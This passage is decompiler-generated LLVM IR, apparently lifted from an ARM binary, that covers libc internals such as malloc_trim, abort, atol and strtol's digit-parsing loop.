  %v0_14ffc = load i32, i32* %r2.global-to-local, align 4
  %v1_14ffc = load i32, i32* %r1.global-to-local, align 4
  %v2_14ffc = add i32 %v1_14ffc, 12
  %v3_14ffc = inttoptr i32 %v2_14ffc to i32*
  store i32 %v0_14ffc, i32* %v3_14ffc, align 4
  %v0_15000 = load i32, i32* %ip.global-to-local, align 4
  %v1_15000 = load i32, i32* %r0.global-to-local, align 4
  %v2_15000 = add i32 %v1_15000, %v0_15000
  store i32 %v2_15000, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15004

dec_label_pc_15004:                               ; preds = %dec_label_pc_14fc0.dec_label_pc_15004_crit_edge, %dec_label_pc_14ff8
  %v0_15014 = phi i32 [ %v0_15014.pre, %dec_label_pc_14fc0.dec_label_pc_15004_crit_edge ], [ %v2_15000, %dec_label_pc_14ff8 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_15008 = load i32, i32* @r7, align 4
  %v2_15008 = add i32 %v0_15008, 64
  %v3_15008 = inttoptr i32 %v2_15008 to i32*
  %v4_15008 = load i32, i32* %v3_15008, align 4
  %v1_1500c = add i32 %v4_15008, 52
  store i32 %v1_1500c, i32* %r3.global-to-local, align 4
  %v1_15010 = add i32 %v4_15008, 60
  %v2_15010 = inttoptr i32 %v1_15010 to i32*
  %v3_15010 = load i32, i32* %v2_15010, align 4
  store i32 %v3_15010, i32* %r1.global-to-local, align 4
  %v1_15014 = or i32 %v0_15014, 1
  store i32 %v1_15014, i32* %r2.global-to-local, align 4
  %v1_15018 = load i32, i32* %r4.global-to-local, align 4
  %v2_15018 = add i32 %v1_15018, 12
  %v3_15018 = inttoptr i32 %v2_15018 to i32*
  store i32 %v1_1500c, i32* %v3_15018, align 4
  %v0_1501c = load i32, i32* %r1.global-to-local, align 4
  %v1_1501c = load i32, i32* %r4.global-to-local, align 4
  %v2_1501c = add i32 %v1_1501c, 8
  %v3_1501c = inttoptr i32 %v2_1501c to i32*
  store i32 %v0_1501c, i32* %v3_1501c, align 4
  %v0_15020 = load i32, i32* %r2.global-to-local, align 4
  %v1_15020 = load i32, i32* %r4.global-to-local, align 4
  %v2_15020 = add i32 %v1_15020, 4
  %v3_15020 = inttoptr i32 %v2_15020 to i32*
  store i32 %v0_15020, i32* %v3_15020, align 4
  %v0_15024 = load i32, i32* %ip.global-to-local, align 4
  %v1_15024 = load i32, i32* %r4.global-to-local, align 4
  %v3_15024 = add i32 %v1_15024, %v0_15024
  %v4_15024 = inttoptr i32 %v3_15024 to i32*
  store i32 %v0_15024, i32* %v4_15024, align 4
  %v0_15028 = load i32, i32* %r4.global-to-local, align 4
  %v1_15028 = load i32, i32* %r1.global-to-local, align 4
  %v2_15028 = add i32 %v1_15028, 12
  %v3_15028 = inttoptr i32 %v2_15028 to i32*
  store i32 %v0_15028, i32* %v3_15028, align 4
  %v0_1502c = load i32, i32* %r4.global-to-local, align 4
  %v1_1502c = load i32, i32* %r3.global-to-local, align 4
  %v2_1502c = add i32 %v1_1502c, 8
  %v3_1502c = inttoptr i32 %v2_1502c to i32*
  store i32 %v0_1502c, i32* %v3_1502c, align 4
  br label %dec_label_pc_15044

dec_label_pc_15034:                               ; preds = %dec_label_pc_14fa8
  %v2_15034 = add i32 %v1_14fb8, %v0_15034
  store i32 %v2_15034, i32* %ip.global-to-local, align 4
  %v1_15038 = or i32 %v2_15034, 1
  store i32 %v1_15038, i32* %r3.global-to-local, align 4
  %v0_1503c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1503c, i32* %v2_14fb0, align 4
  %v0_15040 = load i32, i32* %r3.global-to-local, align 4
  %v1_15040 = load i32, i32* %r4.global-to-local, align 4
  %v2_15040 = add i32 %v1_15040, 4
  %v3_15040 = inttoptr i32 %v2_15040 to i32*
  store i32 %v0_15040, i32* %v3_15040, align 4
  br label %dec_label_pc_15044

dec_label_pc_15044:                               ; preds = %dec_label_pc_15004, %dec_label_pc_15034
  %v0_15044 = load i32, i32* %ip.global-to-local, align 4
  %v3_15048 = icmp ult i32 %v0_15044, 131070
  br i1 %v3_15048, label %dec_label_pc_150b4, label %dec_label_pc_1504c

dec_label_pc_1504c:                               ; preds = %dec_label_pc_15044
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_15050 = load i32, i32* @r7, align 4
  %v2_15050 = add i32 %v0_15050, 64
  %v3_15050 = inttoptr i32 %v2_15050 to i32*
  %v4_15050 = load i32, i32* %v3_15050, align 4
  store i32 %v4_15050, i32* @r4, align 4
  %v1_15054 = inttoptr i32 %v4_15050 to i32*
  %v2_15054 = load i32, i32* %v1_15054, align 4
  store i32 %v2_15054, i32* %r3.global-to-local, align 4
  %v1_15058 = and i32 %v2_15054, 2
  %v2_15058 = icmp eq i32 %v1_15058, 0
  br i1 %v2_15058, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_1504c
  store i32 %v4_15050, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1504c, %bb
  %v1_15060 = xor i1 %v2_15058, true
  call void @__pseudo_cond_branch(i1 %v1_15060, i32 ptrtoint (i32* @global_var_14d04.658 to i32))
  %v0_15064 = load i32, i32* @r4, align 4
  %v1_15064 = add i32 %v0_15064, 44
  %v2_15064 = inttoptr i32 %v1_15064 to i32*
  %v3_15064 = load i32, i32* %v2_15064, align 4
  store i32 %v3_15064, i32* %r3.global-to-local, align 4
  %v1_15068 = add i32 %v3_15064, 4
  %v2_15068 = inttoptr i32 %v1_15068 to i32*
  %v3_15068 = load i32, i32* %v2_15068, align 4
  store i32 %v3_15068, i32* %r3.global-to-local, align 4
  %v1_1506c = add i32 %v0_15064, 836
  %v2_1506c = inttoptr i32 %v1_1506c to i32*
  %v3_1506c = load i32, i32* %v2_1506c, align 4
  store i32 %v3_1506c, i32* %r2.global-to-local, align 4
  %v1_15070 = and i32 %v3_15068, -4
  store i32 %v1_15070, i32* %r3.global-to-local, align 4
  %v3_15074 = icmp ult i32 %v1_15070, %v3_1506c
  br i1 %v3_15074, label %dec_label_pc_150b4, label %dec_label_pc_1507c

dec_label_pc_1507c:                               ; preds = %bb16
  store i32 %v0_15064, i32* %r1.global-to-local, align 4
  %v1_15080 = add i32 %v0_15064, 840
  %v2_15080 = inttoptr i32 %v1_15080 to i32*
  %v3_15080 = load i32, i32* %v2_15080, align 4
  store i32 %v3_15080, i32* %r0.global-to-local, align 4
  %v2_15084 = call i32 @__malloc_trim(i32 %v3_15080, i32 %v0_15064)
  store i32 %v2_15084, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_150b4

dec_label_pc_1508c:                               ; preds = %dec_label_pc_14f50
  %v2_1508c = inttoptr i32 %v1_14f20 to i32*
  %v3_1508c = load i32, i32* %v2_1508c, align 4
  store i32 %v3_1508c, i32* %r0.global-to-local, align 4
  %v1_15090 = add i32 %v4_14f10, 848
  %v2_15090 = inttoptr i32 %v1_15090 to i32*
  %v3_15090 = load i32, i32* %v2_15090, align 4
  store i32 %v3_15090, i32* %r2.global-to-local, align 4
  %v1_15094 = add i32 %v4_14f10, 868
  %v2_15094 = inttoptr i32 %v1_15094 to i32*
  %v3_15094 = load i32, i32* %v2_15094, align 4
  %v2_15098 = add i32 %v3_1508c, %v1_14f1c
  store i32 %v2_15098, i32* %r1.global-to-local, align 4
  %v1_1509c = add i32 %v3_15090, -1
  store i32 %v1_1509c, i32* %r2.global-to-local, align 4
  %v2_150a0 = sub i32 %v3_15094, %v2_15098
  store i32 %v2_150a0, i32* %r3.global-to-local, align 4
  store i32 %v2_150a0, i32* %v2_15094, align 4
  %v1_150a8 = load i32, i32* @lr, align 4
  %v2_150a8 = add i32 %v1_150a8, 848
  %v3_150a8 = inttoptr i32 %v2_150a8 to i32*
  store i32 %v1_1509c, i32* %v3_150a8, align 4
  %v0_150ac = load i32, i32* %r0.global-to-local, align 4
  %v1_150ac = load i32, i32* @r5, align 4
  %v2_150ac = sub i32 %v1_150ac, %v0_150ac
  store i32 %v2_150ac, i32* %r0.global-to-local, align 4
  %v4_150b0 = call i32 @munmap(i32 %v2_150ac, i32 %v2_15098, i32 %v1_1509c, i32 %v2_150a0)
  store i32 %v4_150b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_150b4

dec_label_pc_150b4:                               ; preds = %bb16, %dec_label_pc_15044, %dec_label_pc_1507c, %dec_label_pc_14f30, %dec_label_pc_1508c
  store i32 %v2_14ec4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_150c0 = load i32, i32* @r7, align 4
  %v2_150c0 = add i32 %v0_150c0, 44
  %v3_150c0 = inttoptr i32 %v2_150c0 to i32*
  %v4_150c0 = load i32, i32* %v3_150c0, align 4
  store i32 %v4_150c0, i32* %ip.global-to-local, align 4
  store i32 86220, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_150c0)
  br label %dec_label_pc_150cc

dec_label_pc_150cc:                               ; preds = %entry, %dec_label_pc_150b4
  store i32 %v3_14eb8, i32* @r4, align 4
  store i32 %v6_14eb8, i32* @r5, align 4
  store i32 %v9_14eb8, i32* @r6, align 4
  store i32 %v12_14eb8, i32* @r7, align 4
  store i32 %v18_14eb8, i32* @lr, align 4
  ret i32 %v2_14ec4

; uselistorder directives
  uselistorder i32 %v0_15064, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_15024, { 1, 0 }
  uselistorder i32 %v1_14f64, { 1, 0 }
  uselistorder i32 %v0_14f64, { 1, 0 }
  uselistorder i32 %v3_14f38, { 1, 0 }
  uselistorder i32 %v1_14f1c, { 1, 0, 2 }
  uselistorder i32 %v2_14f18, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14f10, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14ec0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_150cc, { 1, 0 }
  uselistorder label %dec_label_pc_150b4, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_15044, { 1, 0 }
  uselistorder label %dec_label_pc_15004, { 1, 0 }
  uselistorder label %dec_label_pc_14ff8, { 1, 0 }
  uselistorder label %dec_label_pc_14ff4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14fa8, { 1, 0 }
}

define i32 @function_150dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_150dc:
  %v0_150dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_150dc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_150dc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_150dc, %bb
  %v4_150f0 = phi i32 [ %arg1, %dec_label_pc_150dc ], [ 0, %bb ]
  ret i32 %v4_150f0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_150f4 = load i32, i32* @r4, align 4
  store i32 %v3_150f4, i32* %stack_var_-12, align 4
  %v6_150f4 = load i32, i32* @r5, align 4
  %v9_150f4 = load i32, i32* @lr, align 4
  %v4_15104 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_15104, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_15104, i32* @r0, align 4
  %v0_15114 = call i32 @__malloc_consolidate()
  %v0_15118 = load i32, i32* @r4, align 4
  %v0_1511c = load i32, i32* @r5, align 4
  %v2_15124 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15124, i32* @r4, align 4
  store i32 %v6_150f4, i32* @r5, align 4
  store i32 %v9_150f4, i32* @lr, align 4
  %v2_15128 = call i32 @__malloc_trim(i32 %v0_15118, i32 %v0_1511c)
  %v0_1512c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1512c, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_1512c = load i32, i32* @lr, align 4
  %v3_1512c = inttoptr i32 %v2_15128 to i32*
  store i32 %v1_1512c, i32* %v3_1512c, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_15130 = phi i32 [ %v2_15128, %entry ], [ 0, %bb ]
  ret i32 %v4_15130

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r5, align 4
  %v4_1514c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 16) to i32*), align 4
  store i32 86360, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1514c)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_15174 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_1517c = load i32, i32* @r5, align 4
  %v2_1517c = add i32 %v0_1517c, 660
  %v3_1517c = inttoptr i32 %v2_1517c to i32*
  %v4_1517c = load i32, i32* %v3_1517c, align 4
  %v2_15180 = icmp eq i32 %v4_1517c, 0
  br i1 %v2_15180, label %dec_label_pc_15188, label %dec_label_pc_151c8

dec_label_pc_15188:                               ; preds = %entry
  store i32 1, i32* %v3_1517c, align 4
  br label %dec_label_pc_15190

dec_label_pc_15190:                               ; preds = %dec_label_pc_151d8, %dec_label_pc_15188
  %v0_15194 = load i32, i32* @r5, align 4
  %v2_15194 = add i32 %v0_15194, 212
  store i32 %v2_15194, i32* @r4, align 4
  %v2_151a0 = add i32 %v0_15194, 68
  %v3_151a0 = inttoptr i32 %v2_151a0 to i32*
  %v4_151a0 = load i32, i32* %v3_151a0, align 4
  call void @__pseudo_branch(i32 %v4_151a0)
  %v1_151b0 = call i32 @__GI_raise(i32 6)
  %v0_151bc = load i32, i32* @r5, align 4
  %v2_151bc = add i32 %v0_151bc, 16
  %v3_151bc = inttoptr i32 %v2_151bc to i32*
  %v4_151bc = load i32, i32* %v3_151bc, align 4
  store i32 86472, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_151bc)
  %v0_151cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_151c8

dec_label_pc_151c8:                               ; preds = %entry, %dec_label_pc_15190
  %v1_151e0 = phi i32 [ %v0_1517c, %entry ], [ %v0_151cc.pre, %dec_label_pc_15190 ]
  %v2_151cc = add i32 %v1_151e0, 660
  %v3_151cc = inttoptr i32 %v2_151cc to i32*
  %v4_151cc = load i32, i32* %v3_151cc, align 4
  %v7_151d0 = icmp eq i32 %v4_151cc, 1
  br i1 %v7_151d0, label %dec_label_pc_151d8, label %dec_label_pc_15214

dec_label_pc_151d8:                               ; preds = %dec_label_pc_151c8
  %v2_151d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_151d8, i32* @r4, align 4
  store i32 2, i32* %v3_151cc, align 4
  %v3_151f0 = bitcast i32* %stack_var_-28 to i8*
  %v4_151f0 = call i32 @__GI_memset(i8* %v3_151f0, i32 0, i32 20)
  %v3_1520c = call i32 @__libc_sigaction(i32 6, i32 %v2_151d8, i32 0)
  br label %dec_label_pc_15190

dec_label_pc_15214:                               ; preds = %dec_label_pc_151c8
  %v7_15214 = icmp eq i32 %v4_151cc, 2
  br i1 %v7_15214, label %dec_label_pc_1521c, label %dec_label_pc_15228

dec_label_pc_1521c:                               ; preds = %dec_label_pc_15214
  store i32 3, i32* %v3_151cc, align 4
  %v0_15224 = call i32 @abort()
  %v0_15228.pre = load i32, i32* @r5, align 4
  %v1_15228.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_15228

dec_label_pc_15228:                               ; preds = %dec_label_pc_15214, %dec_label_pc_1521c
  %v3_15234 = phi i32 [ 660, %dec_label_pc_15214 ], [ %v1_15228.pre, %dec_label_pc_1521c ]
  %v2_15234 = phi i32 [ %v1_151e0, %dec_label_pc_15214 ], [ %v0_15228.pre, %dec_label_pc_1521c ]
  %v2_15228 = add i32 %v2_15234, %v3_15234
  %v3_15228 = inttoptr i32 %v2_15228 to i32*
  %v4_15228 = load i32, i32* %v3_15228, align 4
  %v7_1522c = icmp eq i32 %v4_15228, 3
  br i1 %v7_1522c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15228
  store i32 4, i32* %v3_15228, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15228, %bb
  call void @__pseudo_cond_branch(i1 %v7_1522c, i32 ptrtoint (i32* @global_var_16e10.667 to i32))
  br label %dec_label_pc_15240

dec_label_pc_15240:                               ; preds = %dec_label_pc_15240, %.thread2
  %v0_15240 = call i32 @abort()
  br label %dec_label_pc_15240

; uselistorder directives
  uselistorder i32* %v3_151cc, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_raise, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_15228, { 1, 0 }
  uselistorder label %dec_label_pc_151c8, { 1, 0 }
}

define i32 @function_1524c(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1524c:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_1524c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1524c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1524c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1524c, %bb
  %v4_15258 = phi i32 [ %tmp, %dec_label_pc_1524c ], [ 0, %bb ]
  ret i32 %v4_15258

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_1526c = call i32 @strtol()
  ret i32 %v0_1526c
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_15288 = call i32 @_stdlib_strto_l()
  ret i32 %v0_15288
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %ip.global-to-local, align 4
  %v0_152ac = load i32, i32* @r1, align 4
  store i32 %v0_152ac, i32* %sb.global-to-local, align 4
  %v0_152b0 = load i32, i32* @r2, align 4
  store i32 %v0_152b0, i32* %r5.global-to-local, align 4
  %v0_152b4 = load i32, i32* @r0, align 4
  store i32 %v0_152b4, i32* %r4.global-to-local, align 4
  %v0_152b8 = load i32, i32* @r3, align 4
  br label %dec_label_pc_152c4

dec_label_pc_152c0:                               ; preds = %dec_label_pc_152c4
  %v1_152c0 = add i32 %v0_152fc, 1
  store i32 %v1_152c0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_152c4

dec_label_pc_152c4:                               ; preds = %entry, %dec_label_pc_152c0
  %v0_152fc = phi i32 [ %v0_152b4, %entry ], [ %v1_152c0, %dec_label_pc_152c0 ]
  %v1_152c4 = inttoptr i32 %v0_152fc to i8*
  %v2_152c4 = load i8, i8* %v1_152c4, align 1
  %v3_152c4 = zext i8 %v2_152c4 to i32
  store i32 %v3_152c4, i32* %r1.global-to-local, align 4
  %v4_152c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 276) to i32*), align 4
  %v2_152cc = mul nuw nsw i32 %v3_152c4, 2
  %v2_152d0 = add i32 %v2_152cc, %v4_152c8
  %v3_152d0 = inttoptr i32 %v2_152d0 to i16*
  %v4_152d0 = load i16, i16* %v3_152d0, align 2
  %v1_152d4 = and i16 %v4_152d0, 32
  %v2_152d4 = icmp eq i16 %v1_152d4, 0
  br i1 %v2_152d4, label %dec_label_pc_152dc, label %dec_label_pc_152c0

dec_label_pc_152dc:                               ; preds = %dec_label_pc_152c4
  %v7_152dc = icmp eq i8 %v2_152c4, 43
  br i1 %v7_152dc, label %dec_label_pc_152fc, label %dec_label_pc_152e4

dec_label_pc_152e4:                               ; preds = %dec_label_pc_152dc
  %v7_152e4 = icmp eq i8 %v2_152c4, 45
  br i1 %v7_152e4, label %dec_label_pc_152fc, label %bb

bb:                                               ; preds = %dec_label_pc_152e4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15300

dec_label_pc_152fc:                               ; preds = %dec_label_pc_152dc, %dec_label_pc_152e4
  %storemerge47 = phi i32 [ 1, %dec_label_pc_152e4 ], [ 0, %dec_label_pc_152dc ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_152fc = add i32 %v0_152fc, 1
  store i32 %v1_152fc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15300

dec_label_pc_15300:                               ; preds = %bb, %dec_label_pc_152fc
  %v0_15320 = phi i32 [ %v0_152fc, %bb ], [ %v1_152fc, %dec_label_pc_152fc ]
  %v1_15300 = and i32 %v0_152b0, -17
  %v3_15300 = icmp eq i32 %v1_15300, 0
  br i1 %v3_15300, label %dec_label_pc_1530c, label %bb60

bb60:                                             ; preds = %dec_label_pc_15300
  br label %bb64

dec_label_pc_1530c:                               ; preds = %dec_label_pc_15300
  %v1_1530c = inttoptr i32 %v0_15320 to i8*
  %v2_1530c = load i8, i8* %v1_1530c, align 1
  %v7_15310 = icmp eq i8 %v2_1530c, 48
  %v1_15314 = add i32 %v0_152b0, 10
  store i32 %v1_15314, i32* %r5.global-to-local, align 4
  br i1 %v7_15310, label %dec_label_pc_15320, label %bb61

bb61:                                             ; preds = %dec_label_pc_1530c
  br label %.thread8

dec_label_pc_15320:                               ; preds = %dec_label_pc_1530c
  %v1_15320 = add i32 %v0_15320, 1
  %v2_15320 = inttoptr i32 %v1_15320 to i8*
  %v3_15320 = load i8, i8* %v2_15320, align 1
  %v4_15320 = zext i8 %v3_15320 to i32
  store i32 %v1_15320, i32* %r4.global-to-local, align 4
  %v1_15324 = or i32 %v4_15320, 32
  %v7_15328 = icmp eq i32 %v1_15324, 120
  %v1_1532c = add i32 %v0_152b0, 8
  store i32 %v1_1532c, i32* %r5.global-to-local, align 4
  br i1 %v7_15328, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_15320
  %v3_15338 = mul i32 %v1_1532c, 2
  store i32 %v3_15338, i32* %r5.global-to-local, align 4
  %v2_1533c = add i32 %v0_15320, 2
  store i32 %v2_1533c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15320, %bb61, %bb62
  %v1_1541030 = phi i32 [ %v0_152b4, %bb61 ], [ %v1_15320, %bb62 ], [ %v1_15320, %dec_label_pc_15320 ]
  %v0_1538c21 = phi i32 [ %v0_15320, %bb61 ], [ %v2_1533c, %bb62 ], [ %v1_15320, %dec_label_pc_15320 ]
  %v0_15340 = phi i32 [ %v1_15314, %bb61 ], [ %v3_15338, %bb62 ], [ %v1_1532c, %dec_label_pc_15320 ]
  %v5_15344 = icmp slt i32 %v0_15340, 16
  br i1 %v5_15344, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_1541029 = phi i32 [ %v0_152b4, %bb60 ], [ %v1_1541030, %.thread8 ], [ %v1_1541030, %bb63 ]
  %v0_1538c20 = phi i32 [ %v0_15320, %bb60 ], [ %v0_1538c21, %.thread8 ], [ %v0_1538c21, %bb63 ]
  %v0_1536c = phi i32 [ %v0_152b0, %bb60 ], [ %v0_15340, %.thread8 ], [ 16, %bb63 ]
  %v1_15348 = add i32 %v0_1536c, -2
  %tmp = icmp ugt i32 %v1_15348, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_15358

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1540c

dec_label_pc_15358:                               ; preds = %bb64
  %v2_15360 = udiv i32 -1, %v0_1536c
  %v3_15360 = urem i32 -1, %v0_1536c
  store i32 %v0_1536c, i32* %r1.global-to-local, align 4
  %v1_15370 = urem i32 %v3_15360, 256
  store i32 %v1_15370, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_15360, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1538c

dec_label_pc_15388:                               ; preds = %bb71, %dec_label_pc_153e8
  %v0_15388 = phi i32 [ %v1_153c844, %bb71 ], [ %v0_15388.pre, %dec_label_pc_153e8 ]
  br label %dec_label_pc_1538c

dec_label_pc_1538c:                               ; preds = %dec_label_pc_15358, %dec_label_pc_15388
  %v1_1541027 = phi i32 [ %v1_1541029, %dec_label_pc_15358 ], [ %v0_15388, %dec_label_pc_15388 ]
  %v0_153c8 = phi i32 [ %v0_1538c20, %dec_label_pc_15358 ], [ %v0_15388, %dec_label_pc_15388 ]
  %v1_1538c = inttoptr i32 %v0_153c8 to i8*
  %v2_1538c = load i8, i8* %v1_1538c, align 1
  %v3_1538c = zext i8 %v2_1538c to i32
  %v1_15390 = add nsw i32 %v3_1538c, -48
  %v1_15394 = urem i32 %v1_15390, 256
  store i32 %v1_15394, i32* %r1.global-to-local, align 4
  %v1_1539c = or i32 %v3_1538c, 32
  %tmp79 = icmp ult i32 %v1_15394, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_153a4

dec_label_pc_153a4:                               ; preds = %dec_label_pc_1538c
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_1539c, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_153a4
  %v1_153a8 = add nsw i32 %v1_1539c, -87
  %v5_153b0 = urem i32 %v1_153a8, 256
  store i32 %v5_153b0, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_1538c, %dec_label_pc_153a4, %bb65
  %v3_153e0 = phi i32 [ %v1_15394, %dec_label_pc_1538c ], [ 40, %dec_label_pc_153a4 ], [ %v5_153b0, %bb65 ]
  %v1_153b4 = load i32, i32* %r5.global-to-local, align 4
  %v6_153b8 = icmp slt i32 %v3_153e0, %v1_153b4
  br i1 %v6_153b8, label %dec_label_pc_153bc, label %dec_label_pc_1540c.loopexit

dec_label_pc_153bc:                               ; preds = %bb66
  %v0_153bc = load i32, i32* %ip.global-to-local, align 4
  %v1_153bc = load i32, i32* %r8.global-to-local, align 4
  %v9_153bc = icmp eq i32 %v0_153bc, %v1_153bc
  br i1 %v9_153bc, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_153bc
  %v1_153c840 = add i32 %v0_153c8, 1
  store i32 %v1_153c840, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_153d0

bb67:                                             ; preds = %dec_label_pc_153bc
  %v3_153bc = icmp ult i32 %v0_153bc, %v1_153bc
  %v1_153c8 = add i32 %v0_153c8, 1
  store i32 %v1_153c8, i32* %r4.global-to-local, align 4
  br i1 %v3_153bc, label %dec_label_pc_153d0, label %dec_label_pc_153e8

dec_label_pc_153d0:                               ; preds = %bb67, %.thread39
  %v1_153c844 = phi i32 [ %v1_153c840, %.thread39 ], [ %v1_153c8, %bb67 ]
  %v4_153d82443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_153d0 = load i32, i32* %sl.global-to-local, align 4
  %v3_153d0 = icmp uge i32 %v3_153e0, %v1_153d0
  %v9_153d0 = icmp eq i32 %v3_153e0, %v1_153d0
  %v2_153d4 = xor i1 %v3_153d0, true
  %v3_153d4 = or i1 %v9_153d0, %v2_153d4
  br i1 %v3_153d4, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_153d0
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_153d0, %bb68
  %v4_153d8 = phi i32 [ %v4_153d82443, %dec_label_pc_153d0 ], [ 0, %bb68 ]
